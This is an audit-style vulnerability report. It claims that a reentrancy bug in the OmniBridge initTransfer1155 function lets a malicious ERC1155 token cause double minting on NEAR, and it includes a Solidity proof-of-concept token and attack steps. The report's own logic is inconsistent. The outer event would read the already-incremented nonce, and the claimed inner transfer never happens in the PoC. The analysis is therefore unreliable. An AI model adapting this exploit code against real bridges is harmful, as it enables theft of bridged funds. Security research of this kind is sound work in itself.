### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Enables Double-Spending of Bridged Funds — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` in `OmniBridge.sol` violates the Check-Effects-Interactions pattern: it increments `currentOriginNonce` and then makes an external `safeTransferFrom` call to an untrusted ERC1155 token contract **before** emitting the `InitTransfer` event. A malicious ERC1155 token can re-enter `initTransfer1155` during `safeTransferFrom`, causing two `InitTransfer` events to be emitted with only one actual token transfer. Because the NEAR side treats every emitted `InitTransfer` event as proof that tokens are locked on EVM, it finalizes both transfers and mints double the tokens to the attacker.

---

### Finding Description

`initTransfer1155` executes in this order: [1](#0-0) 

```
1. currentOriginNonce += 1                          // nonce = N
2. IERC1155(tokenAddress).safeTransferFrom(...)     // ← external call to untrusted token
3. initTransferExtension(...)                        // ← another external call
4. emit InitTransfer(..., currentOriginNonce, ...)   // ← event emitted AFTER external calls
```

The ERC1155 standard mandates that `safeTransferFrom` calls `onERC1155Received` on the recipient, but the malicious token's `safeTransferFrom` implementation can also call back into `initTransfer1155` **before** invoking `onERC1155Received`. There is no `nonReentrant` guard on `initTransfer1155`.

**Re-entrant execution trace:**

| Step | Call | `currentOriginNonce` | Tokens transferred | Event emitted |
|------|------|---------------------|--------------------|---------------|
| 1 | Outer `initTransfer1155` enters | N | — | — |
| 2 | Outer calls `safeTransferFrom` → malicious token re-enters | — | — | — |
| 3 | Inner `initTransfer1155` enters | N+1 | ✅ (inner call actually transfers) | `InitTransfer(nonce=N+1)` |
| 4 | Inner returns; outer `safeTransferFrom` returns | — | ❌ (outer call: no tokens moved) | — |
| 5 | Outer emits event | N | ❌ | `InitTransfer(nonce=N)` |

Two `InitTransfer` events with distinct nonces are now in the EVM transaction log, but only one set of tokens was ever transferred to the bridge.

The NEAR side's documented security invariant is: [2](#0-1) 

> "the NEAR side will treat any emitted event as proof that tokens are held"

`fin_transfer_callback` on NEAR uses `add_fin_transfer` which inserts into `finalised_transfers` keyed by `(origin_chain, origin_nonce)`: [3](#0-2) 

Since nonces N and N+1 are distinct, both transfers pass the replay check and are finalized independently, minting tokens on NEAR for both.

The bridge's `onERC1155Received` does not block this because it only checks `operator != address(this)` — and during both the outer and inner `safeTransferFrom` calls the bridge itself is the operator: [4](#0-3) 

---

### Impact Explanation

**Critical.** An attacker who deploys a malicious ERC1155 token and registers it with the bridge can mint an unbounded multiple of tokens on NEAR relative to what was actually locked on EVM. Each re-entrant call depth adds one extra `InitTransfer` event. This is unauthorized minting / theft of bridged funds across the EVM→NEAR direction.

---

### Likelihood Explanation

**Realistic.** The attacker only needs to:
1. Deploy a malicious ERC1155 contract (no admin access required).
2. Call the permissionless `logMetadata1155` to register it.
3. Wait for the NEAR side to index the `LogMetadata` event.
4. Call `initTransfer1155` with the malicious token.

All steps are available to an unprivileged bridge user. No admin compromise, key leak, or validator collusion is required.

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to `initTransfer1155` (and, for consistency, to `initTransfer`). This is the minimal fix that preserves the existing event-transfer atomicity invariant.

Alternatively, restructure `initTransfer1155` to follow strict CEI: record all state changes and emit the event **before** the external `safeTransferFrom` call — but this conflicts with the documented invariant that the event must only be emitted after tokens are confirmed locked, so a reentrancy guard is the preferred resolution.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 is ERC1155 {
    IOmniBridge public bridge;
    uint256 public tokenId;
    bool public reentered;

    constructor(address _bridge, uint256 _tokenId) ERC1155("") {
        bridge = IOmniBridge(_bridge);
        tokenId = _tokenId;
    }

    // Override safeTransferFrom to re-enter before completing the transfer
    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes memory data
    ) public override {
        if (!reentered) {
            reentered = true;
            // Re-enter initTransfer1155 — inner call gets nonce N+1 and emits its event
            bridge.initTransfer1155(address(this), tokenId, uint128(amount), 0, 0, "attacker.near", "");
        }
        // Outer call: do NOT actually transfer tokens — just return silently
        // onERC1155Received will be called with operator=bridge, passing the check
        _doSafeTransferAcceptanceCheck(msg.sender, from, to, id, amount, data);
    }

    function mint(address to, uint256 id, uint256 amount) external {
        _mint(to, id, amount, "");
    }
}
```

**Attack steps:**
1. Deploy `MaliciousERC1155` pointing at `OmniBridge`.
2. Call `bridge.logMetadata1155(address(malicious), tokenId)` — permissionless.
3. Wait for NEAR to index the `LogMetadata` event and register the token.
4. Call `bridge.initTransfer1155(address(malicious), tokenId, 100, 0, 0, "attacker.near", "")`.
5. During `safeTransferFrom`, `MaliciousERC1155` re-enters → inner call emits `InitTransfer(nonce=N+1, amount=100)`.
6. Outer call emits `InitTransfer(nonce=N, amount=100)` — no tokens were actually transferred for this one.
7. NEAR relayer submits proofs for both events; `fin_transfer_callback` finalizes both (distinct nonces pass `add_fin_transfer`).
8. Attacker receives 200 units of the bridged token on NEAR having locked only 100 on EVM.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L447-490)
```text
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```

**File:** near/omni-bridge/src/lib.rs (L2226-2234)
```rust
    fn add_fin_transfer(&mut self, transfer_id: &TransferId) -> NearToken {
        let storage_usage = env::storage_usage();
        require!(
            self.finalised_transfers.insert(transfer_id),
            BridgeError::TransferAlreadyFinalised.as_ref()
        );
        env::storage_byte_cost()
            .saturating_mul((env::storage_usage().saturating_sub(storage_usage)).into())
    }
```
